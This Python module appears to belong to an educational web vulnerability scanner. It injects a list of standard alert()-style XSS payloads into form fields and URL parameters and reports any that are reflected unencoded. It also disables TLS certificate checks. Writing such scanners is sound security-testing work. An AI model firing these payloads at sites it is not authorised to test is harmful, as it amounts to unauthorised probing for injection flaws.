"""
Module: xss.py
OWASP  : A03:2021 – Injection (XSS)
Purpose: Test for reflected and stored Cross-Site Scripting vulnerabilities
         in HTML forms and URL parameters.
"""

import requests
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

HEADERS = {"User-Agent": "WebVulnScanner/1.0 (Educational Pentest Tool)"}

# ── XSS Payloads ──────────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "\"'><script>alert(1)</script>",
    "<svg/onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "';alert('XSS')//",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<<SCRIPT>alert('XSS')//<</SCRIPT>",
    "<input autofocus onfocus=alert(1)>",
]


def submit_form(form, data, timeout=5):
    """Submit form with injected data."""
    try:
        if form["method"] == "post":
            return requests.post(form["action"], data=data,
                                 headers=HEADERS, timeout=timeout, verify=False)
        else:
            return requests.get(form["action"], params=data,
                                headers=HEADERS, timeout=timeout, verify=False)
    except Exception:
        return None


def test_reflected_xss_forms(forms, timeout=5):
    """Test each form field for reflected XSS."""
    vulns = []
    for form in forms:
        for inp in form["inputs"]:
            if inp["type"] in ("submit", "button", "image", "reset", "hidden"):
                continue

            for payload in XSS_PAYLOADS:
                data = {}
                for i in form["inputs"]:
                    data[i["name"]] = i["value"] or "test"
                data[inp["name"]] = payload

                resp = submit_form(form, data, timeout)
                if resp and payload in resp.text:
                    vulns.append({
                        "url":     form["action"],
                        "type":    "Reflected XSS (form)",
                        "param":   inp["name"],
                        "payload": payload,
                        "detail":  (
                            f"Reflected XSS in form field '{inp['name']}' at {form['action']}. "
                            f"Payload reflected unencoded in response."
                        )
                    })
                    break  # One finding per input field
    return vulns


def test_reflected_xss_urls(urls, timeout=5):
    """Test URL query parameters for reflected XSS."""
    vulns = []
    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            continue

        for param in params:
            for payload in XSS_PAYLOADS:
                test_params = {k: (v[0] if v else "") for k, v in params.items()}
                test_params[param] = payload

                test_url = parsed._replace(query=urlencode(test_params)).geturl()
                try:
                    resp = requests.get(test_url, headers=HEADERS, timeout=timeout, verify=False)
                    if payload in resp.text:
                        vulns.append({
                            "url":     test_url,
                            "type":    "Reflected XSS (URL param)",
                            "param":   param,
                            "payload": payload,
                            "detail":  (
                                f"Reflected XSS in URL parameter '{param}'. "
                                f"Payload reflected unencoded in response."
                            )
                        })
                        break
                except Exception:
                    pass
    return vulns


def test_xss(forms, urls, timeout=5):
    """Run all XSS tests and return combined findings."""
    results = []
    results.extend(test_reflected_xss_forms(forms, timeout))
    results.extend(test_reflected_xss_urls(urls, timeout))
    return results
